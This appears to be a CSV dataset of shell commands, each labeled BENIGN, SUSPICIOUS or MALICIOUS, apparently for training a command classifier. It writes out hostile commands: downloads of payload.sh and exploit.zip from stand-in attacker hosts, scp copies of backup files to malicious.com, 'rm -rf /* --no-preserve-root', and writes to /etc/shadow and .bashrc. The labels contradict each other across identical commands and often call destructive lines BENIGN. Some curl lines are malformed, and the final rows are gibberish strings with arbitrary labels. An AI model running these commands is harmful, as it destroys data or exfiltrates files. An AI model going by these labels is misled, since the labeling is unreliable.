command,label
WGET   HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,SUSPICIOUS
 PING GOOGLE.COM,BENIGN
SCP DATA.TAR.GZ   USER@192.168.0.2:/TMP/,MALICIOUS
curl   -o http://suspicious.org/payload.sh,BENIGN
SCP   DATA.TAR.GZ ADMIN@MALICIOUS.COM:/TMP/,SUSPICIOUS
ECHO 'OWNED' >   /VAR/LOG/SYSLOG,MALICIOUS
scp backup.sql   root@backup.server:/root/,MALICIOUS
scp   data.tar.gz admin@malicious.com:/var/www,SUSPICIOUS
curl -o http://evil.com/exploit.zip,BENIGN
scp   backup.sql admin@backup.server:/root/,SUSPICIOUS
scp   backup.sql root@192.168.0.2:/root/,BENIGN
SUDO   APT INSTALL NMAP,BENIGN
ECHO 'OWNED'   >> /VAR/LOG/SYSLOG,SUSPICIOUS
scp data.tar.gz root@backup.server:/var/www ,SUSPICIOUS
RM -RF   /* --NO-PRESERVE-ROOT,MALICIOUS
scp data.tar.gz   user@malicious.com:/tmp/,MALICIOUS
 curl -o http://suspicious.org/update.bin,SUSPICIOUS
scp data.tar.gz admin@192.168.0.2:/var/www,SUSPICIOUS
 WGET HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
echo 'hacked' >> /etc/shadow ,BENIGN
SCP BACKUP.SQL ROOT@BACKUP.SERVER:/ROOT/,BENIGN
scp backup.sql   root@192.168.0.2:/root/,MALICIOUS
SCP BACKUP.SQL   ROOT@BACKUP.SERVER:/ROOT/,SUSPICIOUS
SCP DATA.TAR.GZ USER@192.168.0.2:/VAR/WWW,BENIGN
 SCP FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS
ECHO 'OWNED' >> /VAR/LOG/SYSLOG ,MALICIOUS
 CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
echo 'hacked' >> /var/log/syslog ,MALICIOUS
scp data.tar.gz root@malicious.com:/var/www ,SUSPICIOUS
SCP DATA.TAR.GZ   ROOT@BACKUP.SERVER:/ROOT/,BENIGN
scp   data.tar.gz root@backup.server:/tmp/,MALICIOUS
scp file.txt   user@192.168.0.2:/root/,SUSPICIOUS
SCP FILE.TXT ROOT@192.168.0.2:/ROOT/ ,SUSPICIOUS
scp backup.sql   admin@malicious.com:/var/www,BENIGN
ECHO   'OWNED' > /ETC/SHADOW,SUSPICIOUS
ECHO 'HACKED' >> /VAR/LOG/SYSLOG ,BENIGN
 UNAME -A,SUSPICIOUS
 scp file.txt root@malicious.com:/var/www,SUSPICIOUS
curl -o   http://fileshare.com/update.bin,SUSPICIOUS
SCP FILE.TXT USER@192.168.0.2:/TMP/,MALICIOUS
CAT ~/.SSH/KNOWN_HOSTS ,SUSPICIOUS
 scp file.txt root@backup.server:/tmp/,SUSPICIOUS
scp file.txt   admin@192.168.0.2:/var/www,SUSPICIOUS
 CURL -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN,BENIGN
scp data.tar.gz   root@malicious.com:/tmp/,SUSPICIOUS
 ECHO 'OWNED' >> /VAR/LOG/SYSLOG,BENIGN
scp data.tar.gz user@backup.server:/var/www ,SUSPICIOUS
scp file.txt admin@192.168.0.2:/var/www ,BENIGN
WGET HTTP://EVIL.COM/PAYLOAD.SH ,MALICIOUS
SCP   FILE.TXT ADMIN@192.168.0.2:/ROOT/,MALICIOUS
 scp file.txt root@192.168.0.2:/root/,BENIGN
scp file.txt   root@backup.server:/var/www,BENIGN
scp   file.txt admin@malicious.com:/root/,MALICIOUS
ECHO 'OWNED' >> /ROOT/.BASHRC,MALICIOUS
CURL -O   HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,SUSPICIOUS
echo 'pwned' >   /root/.bashrc,BENIGN
 scp file.txt user@192.168.0.2:/tmp/,SUSPICIOUS
SCP   BACKUP.SQL USER@192.168.0.2:/TMP/,SUSPICIOUS
wget http://fileshare.com/update.bin ,SUSPICIOUS
WGET HTTP://EVIL.COM/UPDATE.BIN ,SUSPICIOUS
 CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
scp data.tar.gz   root@192.168.0.2:/var/www,MALICIOUS
PS   AUX | GREP SSHD,BENIGN
scp file.txt root@malicious.com:/var/www,BENIGN
CURL   -O HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
 scp file.txt admin@malicious.com:/root/,SUSPICIOUS
CHMOD 777 /VAR/LOG/SYSLOG ,SUSPICIOUS
echo 'pwned' >> /etc/shadow ,BENIGN
scp   data.tar.gz user@backup.server:/root/,BENIGN
 CURL HTTPS://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
 scp data.tar.gz admin@backup.server:/var/www,MALICIOUS
 scp backup.sql root@malicious.com:/var/www,SUSPICIOUS
scp backup.sql   root@192.168.0.2:/tmp/,SUSPICIOUS
scp   backup.sql root@malicious.com:/tmp/,SUSPICIOUS
 curl -o http://suspicious.org/payload.sh,MALICIOUS
SUDO   APT UPDATE,BENIGN
 CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
scp   file.txt root@malicious.com:/root/,BENIGN
SCP BACKUP.SQL USER@192.168.0.2:/ROOT/,BENIGN
WGET   HTTP://EVIL.COM/UPDATE.BIN,BENIGN
CURL -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
echo 'owned' >>   /root/.bashrc,SUSPICIOUS
scp data.tar.gz admin@malicious.com:/tmp/ ,BENIGN
scp backup.sql   user@backup.server:/tmp/,BENIGN
scp data.tar.gz   admin@backup.server:/root/,MALICIOUS
CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN ,MALICIOUS
 scp backup.sql admin@backup.server:/var/www,SUSPICIOUS
scp backup.sql root@192.168.0.2:/root/ ,MALICIOUS
 WGET HTTP://EVIL.COM/UPDATE.BIN,SUSPICIOUS
scp backup.sql   admin@malicious.com:/tmp/,BENIGN
curl -o   http://evil.com/exploit.zip,MALICIOUS
 ECHO 'OWNED' >> /ETC/SHADOW,BENIGN
scp   data.tar.gz user@backup.server:/tmp/,BENIGN
 CURL HTTPS://FILESHARE.COM/PAYLOAD.SH,BENIGN
 scp backup.sql admin@malicious.com:/tmp/,MALICIOUS
curl -o http://fileshare.com/payload.sh ,MALICIOUS
scp backup.sql admin@192.168.0.2:/var/www ,MALICIOUS
ECHO   'PWNED' >> /VAR/LOG/SYSLOG,SUSPICIOUS
SCP DATA.TAR.GZ ADMIN@BACKUP.SERVER:/ROOT/,BENIGN
scp   data.tar.gz root@backup.server:/root/,SUSPICIOUS
scp file.txt root@malicious.com:/tmp/ ,BENIGN
 ECHO 'OWNED' > /ETC/SHADOW,BENIGN
 scp backup.sql root@192.168.0.2:/var/www,MALICIOUS
 scp backup.sql admin@backup.server:/tmp/,SUSPICIOUS
DU -SH ,BENIGN
SCP FILE.TXT ROOT@MALICIOUS.COM:/TMP/,BENIGN
SUDO APT UPDATE ,BENIGN
 ECHO 'PWNED' >> /ROOT/.BASHRC,SUSPICIOUS
scp file.txt user@malicious.com:/root/ ,MALICIOUS
scp file.txt root@backup.server:/tmp/ ,SUSPICIOUS
SCP DATA.TAR.GZ ADMIN@BACKUP.SERVER:/VAR/WWW ,SUSPICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH ,MALICIOUS
scp backup.sql   admin@backup.server:/var/www,SUSPICIOUS
 ECHO 'HACKED' >> /ROOT/.BASHRC,SUSPICIOUS
wget http://suspicious.org/exploit.zip ,BENIGN
 WGET HTTP://EVIL.COM/EXPLOIT.ZIP,BENIGN
SCP BACKUP.SQL   ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
ECHO 'HACKED' >   /ETC/SHADOW,SUSPICIOUS
scp backup.sql   root@malicious.com:/tmp/,MALICIOUS
scp file.txt admin@malicious.com:/tmp/ ,BENIGN
 scp file.txt root@192.168.0.2:/var/www,MALICIOUS
CD /TMP/ ,SUSPICIOUS
scp   file.txt root@malicious.com:/var/www,MALICIOUS
CURL HTTPS://FILESHARE.COM/UPDATE.BIN ,BENIGN
CHMOD 777 /ROOT/.BASHRC ,BENIGN
PS AUX | GREP   NGINX,SUSPICIOUS
SCP DATA.TAR.GZ USER@192.168.0.2:/TMP/,BENIGN
 scp backup.sql user@malicious.com:/var/www,BENIGN
scp   file.txt user@malicious.com:/root/,SUSPICIOUS
scp data.tar.gz   admin@backup.server:/var/www,MALICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN ,SUSPICIOUS
 curl -o http://evil.com/payload.sh,MALICIOUS
scp backup.sql   root@backup.server:/var/www,MALICIOUS
curl -o   http://fileshare.com/exploit.zip,BENIGN
scp   file.txt admin@malicious.com:/var/www,SUSPICIOUS
SCP DATA.TAR.GZ   ADMIN@192.168.0.2:/ROOT/,MALICIOUS
 ECHO 'HACKED' >> /ETC/SHADOW,MALICIOUS
curl -o http://suspicious.org/update.bin ,MALICIOUS
scp backup.sql admin@malicious.com:/root/ ,SUSPICIOUS
CURL   -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
ECHO   'HACKED' >> /ROOT/.BASHRC,MALICIOUS
 scp file.txt root@backup.server:/var/www,MALICIOUS
 DU -SH,BENIGN
SCP   BACKUP.SQL USER@192.168.0.2:/ROOT/,MALICIOUS
SCP BACKUP.SQL ADMIN@BACKUP.SERVER:/VAR/WWW,BENIGN
ECHO 'HACKED' >>   /ROOT/.BASHRC,SUSPICIOUS
SCP FILE.TXT USER@MALICIOUS.COM:/TMP/,BENIGN
curl   -o http://evil.com/exploit.zip,BENIGN
scp file.txt user@192.168.0.2:/tmp/ ,BENIGN
scp data.tar.gz user@malicious.com:/root/ ,MALICIOUS
SCP BACKUP.SQL ADMIN@MALICIOUS.COM:/VAR/WWW,MALICIOUS
 scp data.tar.gz admin@malicious.com:/tmp/,MALICIOUS
curl   -o http://evil.com/update.bin,SUSPICIOUS
 curl -o http://suspicious.org/exploit.zip,MALICIOUS
CURL   HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
scp data.tar.gz admin@192.168.0.2:/root/ ,BENIGN
scp data.tar.gz   admin@malicious.com:/var/www,BENIGN
 PS AUX | GREP MYSQL,SUSPICIOUS
scp data.tar.gz   admin@malicious.com:/root/,MALICIOUS
 scp backup.sql admin@192.168.0.2:/var/www,BENIGN
ECHO 'PWNED' > /ETC/SHADOW ,SUSPICIOUS
ECHO   'OWNED' > /ROOT/.BASHRC,MALICIOUS
scp backup.sql   user@malicious.com:/var/www,MALICIOUS
scp file.txt   root@192.168.0.2:/tmp/,MALICIOUS
scp file.txt root@192.168.0.2:/root/ ,MALICIOUS
SCP BACKUP.SQL   ADMIN@BACKUP.SERVER:/TMP/,BENIGN
scp   file.txt admin@192.168.0.2:/var/www,BENIGN
scp   data.tar.gz admin@malicious.com:/tmp/,BENIGN
SCP DATA.TAR.GZ ROOT@BACKUP.SERVER:/TMP/,MALICIOUS
 ECHO 'PWNED' >> /VAR/LOG/SYSLOG,MALICIOUS
 scp backup.sql admin@backup.server:/root/,MALICIOUS
SCP   FILE.TXT USER@MALICIOUS.COM:/VAR/WWW,MALICIOUS
SCP BACKUP.SQL   ADMIN@MALICIOUS.COM:/VAR/WWW,SUSPICIOUS
ECHO   'HACKED' > /ETC/SHADOW,MALICIOUS
scp   data.tar.gz root@malicious.com:/root/,BENIGN
scp file.txt user@backup.server:/var/www ,SUSPICIOUS
RM -RF /VAR/ ,BENIGN
 scp backup.sql admin@malicious.com:/root/,SUSPICIOUS
 SCP FILE.TXT USER@MALICIOUS.COM:/VAR/WWW,BENIGN
 scp data.tar.gz user@backup.server:/root/,MALICIOUS
SCP BACKUP.SQL USER@192.168.0.2:/VAR/WWW,SUSPICIOUS
 scp backup.sql root@192.168.0.2:/root/,BENIGN
scp backup.sql   root@backup.server:/tmp/,BENIGN
scp   file.txt root@backup.server:/var/www,MALICIOUS
scp data.tar.gz root@192.168.0.2:/root/ ,MALICIOUS
scp file.txt admin@malicious.com:/root/ ,SUSPICIOUS
ECHO 'HACKED'   > /ETC/SHADOW,BENIGN
scp   backup.sql user@malicious.com:/tmp/,SUSPICIOUS
SCP DATA.TAR.GZ USER@192.168.0.2:/VAR/WWW ,SUSPICIOUS
SCP FILE.TXT   ADMIN@192.168.0.2:/TMP/,MALICIOUS
scp data.tar.gz   user@backup.server:/var/www,SUSPICIOUS
ECHO   'OWNED' > /VAR/LOG/SYSLOG,BENIGN
ECHO 'HACKED' >>   /ETC/SHADOW,MALICIOUS
ECHO 'OWNED'   >> /ROOT/.BASHRC,MALICIOUS
scp file.txt root@192.168.0.2:/var/www ,MALICIOUS
SCP FILE.TXT ROOT@MALICIOUS.COM:/ROOT/,BENIGN
SCP BACKUP.SQL ADMIN@MALICIOUS.COM:/TMP/,MALICIOUS
 ECHO 'HACKED' >> /VAR/LOG/SYSLOG,MALICIOUS
 ECHO 'PWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
scp   backup.sql user@malicious.com:/root/,SUSPICIOUS
ECHO 'PWNED' >   /ETC/SHADOW,BENIGN
scp   data.tar.gz admin@backup.server:/root/,BENIGN
 curl -o http://evil.com/exploit.zip,SUSPICIOUS
 WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
scp   data.tar.gz admin@malicious.com:/root/,BENIGN
 scp backup.sql admin@192.168.0.2:/root/,SUSPICIOUS
scp backup.sql user@malicious.com:/tmp/ ,MALICIOUS
 SCP DATA.TAR.GZ USER@192.168.0.2:/VAR/WWW,BENIGN
scp   backup.sql user@backup.server:/tmp/,MALICIOUS
 WGET HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
scp   backup.sql admin@192.168.0.2:/var/www,BENIGN
scp file.txt user@backup.server:/root/ ,SUSPICIOUS
scp backup.sql   user@backup.server:/var/www,SUSPICIOUS
 SCP FILE.TXT ROOT@192.168.0.2:/TMP/,BENIGN
echo 'owned' >>   /var/log/syslog,SUSPICIOUS
 scp file.txt user@malicious.com:/tmp/,BENIGN
scp backup.sql root@192.168.0.2:/tmp/ ,BENIGN
 scp backup.sql root@malicious.com:/tmp/,MALICIOUS
 scp backup.sql root@192.168.0.2:/tmp/,SUSPICIOUS
CURL -O   HTTP://EVIL.COM/PAYLOAD.SH,BENIGN
ECHO 'PWNED'   >> /VAR/LOG/SYSLOG,SUSPICIOUS
 SCP BACKUP.SQL USER@MALICIOUS.COM:/ROOT/,MALICIOUS
 CURL HTTPS://EVIL.COM/UPDATE.BIN,SUSPICIOUS
SCP   DATA.TAR.GZ USER@MALICIOUS.COM:/TMP/,MALICIOUS
 SCP FILE.TXT USER@192.168.0.2:/VAR/WWW,BENIGN
scp data.tar.gz   root@backup.server:/var/www,MALICIOUS
 PS AUX | GREP NGINX,BENIGN
 scp data.tar.gz root@backup.server:/root/,BENIGN
SCP FILE.TXT ADMIN@192.168.0.2:/VAR/WWW,MALICIOUS
 scp file.txt admin@malicious.com:/var/www,MALICIOUS
 CURL -O HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
 ECHO 'OWNED' >> /ROOT/.BASHRC,SUSPICIOUS
scp   backup.sql admin@malicious.com:/root/,SUSPICIOUS
scp   data.tar.gz root@malicious.com:/tmp/,BENIGN
SCP FILE.TXT USER@192.168.0.2:/VAR/WWW,SUSPICIOUS
 scp file.txt admin@backup.server:/tmp/,BENIGN
SCP DATA.TAR.GZ   ADMIN@BACKUP.SERVER:/ROOT/,MALICIOUS
 SCP FILE.TXT ROOT@BACKUP.SERVER:/ROOT/,MALICIOUS
 SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/TMP/,MALICIOUS
 scp backup.sql user@backup.server:/var/www,SUSPICIOUS
scp file.txt   admin@backup.server:/root/,BENIGN
scp file.txt user@malicious.com:/tmp/ ,MALICIOUS
SCP   BACKUP.SQL ROOT@BACKUP.SERVER:/ROOT/,SUSPICIOUS
SCP BACKUP.SQL ADMIN@192.168.0.2:/ROOT/,SUSPICIOUS
scp backup.sql admin@backup.server:/tmp/ ,MALICIOUS
scp   backup.sql user@backup.server:/root/,SUSPICIOUS
SCP BACKUP.SQL USER@BACKUP.SERVER:/TMP/,SUSPICIOUS
scp   data.tar.gz admin@192.168.0.2:/root/,SUSPICIOUS
ECHO 'PWNED' >>   /VAR/LOG/SYSLOG,MALICIOUS
SCP FILE.TXT USER@BACKUP.SERVER:/ROOT/,BENIGN
PS AUX   | GREP SSHD,BENIGN
scp file.txt root@192.168.0.2:/tmp/ ,MALICIOUS
ECHO 'HACKED' >> /ETC/SHADOW ,BENIGN
ECHO 'HACKED' >> /ROOT/.BASHRC ,MALICIOUS
 scp backup.sql root@backup.server:/root/,SUSPICIOUS
SCP BACKUP.SQL   ROOT@MALICIOUS.COM:/VAR/WWW,SUSPICIOUS
curl -o   http://fileshare.com/payload.sh,SUSPICIOUS
ECHO   'OWNED' >> /ROOT/.BASHRC,SUSPICIOUS
SCP DATA.TAR.GZ ADMIN@192.168.0.2:/TMP/ ,MALICIOUS
scp   backup.sql admin@backup.server:/tmp/,BENIGN
ECHO 'PWNED' >>   /ETC/SHADOW,MALICIOUS
scp file.txt user@192.168.0.2:/var/www ,MALICIOUS
CURL   -O HTTP://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
 curl -O http://fileshare.com/update.bin,SUSPICIOUS
scp backup.sql admin@192.168.0.2:/tmp/ ,SUSPICIOUS
ECHO   'HACKED' >> /VAR/LOG/SYSLOG,MALICIOUS
curl   -o http://suspicious.org/update.bin,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP ,SUSPICIOUS
 scp file.txt user@malicious.com:/var/www,SUSPICIOUS
SCP BACKUP.SQL ADMIN@BACKUP.SERVER:/ROOT/,BENIGN
 scp file.txt root@malicious.com:/tmp/,BENIGN
scp   file.txt user@192.168.0.2:/root/,MALICIOUS
SCP   FILE.TXT ADMIN@192.168.0.2:/VAR/WWW,SUSPICIOUS
scp   backup.sql admin@backup.server:/var/www,BENIGN
LS /TMP/ ,BENIGN
scp   backup.sql admin@malicious.com:/tmp/,SUSPICIOUS
scp backup.sql   admin@192.168.0.2:/var/www,BENIGN
scp   file.txt root@backup.server:/tmp/,BENIGN
SCP FILE.TXT ADMIN@192.168.0.2:/VAR/WWW ,BENIGN
scp   file.txt root@192.168.0.2:/var/www,BENIGN
 scp backup.sql user@malicious.com:/root/,SUSPICIOUS
ECHO   'HACKED' > /VAR/LOG/SYSLOG,MALICIOUS
scp backup.sql   root@192.168.0.2:/var/www,SUSPICIOUS
SCP   DATA.TAR.GZ ROOT@BACKUP.SERVER:/ROOT/,BENIGN
scp   file.txt admin@backup.server:/var/www,BENIGN
scp backup.sql user@malicious.com:/root/ ,SUSPICIOUS
scp   data.tar.gz user@malicious.com:/var/www,MALICIOUS
 CURL HTTPS://EVIL.COM/EXPLOIT.ZIP,SUSPICIOUS
SCP FILE.TXT ROOT@BACKUP.SERVER:/VAR/WWW,SUSPICIOUS
SCP DATA.TAR.GZ   ROOT@MALICIOUS.COM:/TMP/,MALICIOUS
scp   data.tar.gz root@192.168.0.2:/tmp/,BENIGN
CURL -O   HTTP://EVIL.COM/EXPLOIT.ZIP,SUSPICIOUS
ECHO 'HACKED' >>   /VAR/LOG/SYSLOG,BENIGN
CURL -O HTTP://FILESHARE.COM/UPDATE.BIN ,MALICIOUS
CURL HTTPS://FILESHARE.COM/PAYLOAD.SH ,BENIGN
scp backup.sql user@backup.server:/var/www ,MALICIOUS
 CURL -O HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
ECHO   'HACKED' >> /ETC/SHADOW,MALICIOUS
ECHO 'HACKED'   >> /ROOT/.BASHRC,MALICIOUS
ECHO 'HACKED' >   /VAR/LOG/SYSLOG,BENIGN
scp   file.txt root@192.168.0.2:/tmp/,BENIGN
scp   data.tar.gz admin@backup.server:/var/www,MALICIOUS
scp   backup.sql admin@192.168.0.2:/tmp/,MALICIOUS
SCP BACKUP.SQL ADMIN@MALICIOUS.COM:/ROOT/,BENIGN
SCP BACKUP.SQL ROOT@BACKUP.SERVER:/VAR/WWW,SUSPICIOUS
SCP   FILE.TXT ROOT@192.168.0.2:/TMP/,MALICIOUS
SCP   FILE.TXT ROOT@MALICIOUS.COM:/ROOT/,BENIGN
SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/ROOT/ ,MALICIOUS
SCP FILE.TXT   ROOT@MALICIOUS.COM:/TMP/,SUSPICIOUS
scp backup.sql   user@192.168.0.2:/root/,BENIGN
scp file.txt admin@malicious.com:/var/www ,MALICIOUS
 scp data.tar.gz root@malicious.com:/tmp/,BENIGN
SCP BACKUP.SQL ROOT@MALICIOUS.COM:/VAR/WWW,MALICIOUS
scp   data.tar.gz user@malicious.com:/tmp/,MALICIOUS
SCP   BACKUP.SQL ROOT@MALICIOUS.COM:/VAR/WWW,SUSPICIOUS
SCP DATA.TAR.GZ   ADMIN@BACKUP.SERVER:/VAR/WWW,MALICIOUS
 SCP DATA.TAR.GZ USER@MALICIOUS.COM:/VAR/WWW,MALICIOUS
 scp data.tar.gz user@192.168.0.2:/tmp/,MALICIOUS
SCP FILE.TXT ADMIN@192.168.0.2:/ROOT/,MALICIOUS
 SCP BACKUP.SQL USER@192.168.0.2:/ROOT/,MALICIOUS
SCP BACKUP.SQL ADMIN@192.168.0.2:/TMP/ ,MALICIOUS
scp   file.txt admin@backup.server:/root/,SUSPICIOUS
scp file.txt   user@backup.server:/var/www,SUSPICIOUS
SCP DATA.TAR.GZ ROOT@192.168.0.2:/TMP/,MALICIOUS
 scp file.txt user@backup.server:/root/,SUSPICIOUS
CURL HTTPS://EVIL.COM/EXPLOIT.ZIP ,SUSPICIOUS
SCP BACKUP.SQL ADMIN@BACKUP.SERVER:/ROOT/ ,MALICIOUS
curl -o   http://evil.com/payload.sh,BENIGN
SCP FILE.TXT ROOT@192.168.0.2:/VAR/WWW ,SUSPICIOUS
scp   file.txt admin@malicious.com:/tmp/,MALICIOUS
SCP FILE.TXT   ROOT@MALICIOUS.COM:/ROOT/,MALICIOUS
SCP FILE.TXT   ADMIN@192.168.0.2:/ROOT/,BENIGN
scp file.txt   user@malicious.com:/root/,MALICIOUS
scp data.tar.gz   admin@192.168.0.2:/root/,BENIGN
SCP BACKUP.SQL USER@192.168.0.2:/ROOT/ ,SUSPICIOUS
SCP FILE.TXT ROOT@BACKUP.SERVER:/TMP/,SUSPICIOUS
scp backup.sql user@backup.server:/root/ ,MALICIOUS
lsasla,BENIGN
asdkw,BENIGN
,BENIGN
lweor,BENIGN
rani,BENIGN
kwwe,BENIGN
woeo,BENIGN
osaid,BENIGN
ms,BENIGN
lqqq,SUSPICIOUS
azoz,SUSPICIOUS
sos,MALICIOUS
kqwewqe,MALICIOUS
yoyooy,MALICIOUS
uouou,MALICIOUS
oqwqeqw,MALICIOUS
pw;''',MALICIOUS
laslw,MALICIOUS
eoe,MALICIOUS
lsdlw,MALICIOUS
lw,MALICIOUS
oweoe,SUSPICIOUS
liwa,MALICIOUS
woeeeeeeeeeeer,MALICIOUS
manus,SUSPICIOUS
manusai,SUSPICIOUS
hzof,MALICIOUS
ks,SUSPICIOUS
swww,SUSPICIOUS
woe,SUSPICIOUS
o222,BENIGN
,BENIGN
ls,BENIGN
sls,BENIGN
sl,BENIGN
s,BENIGN
